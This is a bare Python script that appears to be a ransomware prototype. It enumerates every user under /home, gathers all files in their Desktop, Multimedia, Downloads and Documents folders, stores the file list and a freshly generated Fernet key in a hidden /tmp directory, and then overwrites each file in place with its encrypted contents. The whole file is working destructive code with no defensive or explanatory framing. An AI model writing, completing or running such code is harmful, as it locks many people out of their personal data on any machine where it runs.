import os
from os.path import abspath, dirname

from cryptography.fernet import Fernet, MultiFernet

directory = r'/home'

users = []
for f in os.scandir(directory):
    if not f.name.startswith('.'):
        users.append(f.path)

for user in users:
    print(user)

target_dirs = [ 'Desktop', 'Multimedia', 'Downloads', 'Documents' ]
folders = []
for user in users:
    for f in os.scandir(user):
        for target in target_dirs:
            if f.name == target:
                folders.append(f.path)

print()

for folder in folders:
    print(folder)

result = []

for folder in folders:
   for dirpath, dirnames, filenames in os.walk(folder):
       for filename in filenames:
           result.append (os.path.join(dirpath, filename))

print(result)

mydir = r'/tmp/hvs45pasdf4hb' 
if not os.path.exists(mydir):
    os.makedirs(mydir)

with open('/tmp/hvs45pasdf4hb/list.txt', 'w') as f:
    for line in result:
        f.write(f"{line}\n")

key = Fernet.generate_key()

with open('/tmp/hvs45pasdf4hb/thekey.key', 'wb') as f:
    f.write(key)

for file in result:
    with open (file, 'rb') as f:
        content = f.read()
    content_encripted = Fernet(key).encrypt(content)
    with open (file, 'wb') as f:
        f.write(content_encripted)
